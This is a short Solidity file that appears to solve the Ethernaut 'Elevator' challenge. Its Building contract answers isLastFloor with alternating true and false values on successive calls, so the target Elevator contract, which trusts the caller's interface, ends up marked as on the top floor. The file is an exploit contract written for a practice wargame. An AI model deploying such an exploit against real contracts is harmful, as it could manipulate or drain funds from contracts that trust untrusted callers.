// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

contract Elevator {
    function goTo(uint _floor) public {}
}

contract Building {
    Elevator elevator;
    uint constant LAST_FLOOR = 6942420;
    uint zebi = 0;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        zebi++;
        return zebi % 2 == 0 ? false : true;
    }

    function winnerWinnerChickenDinner(uint _floor) public {
        elevator.goTo(_floor);
    }
}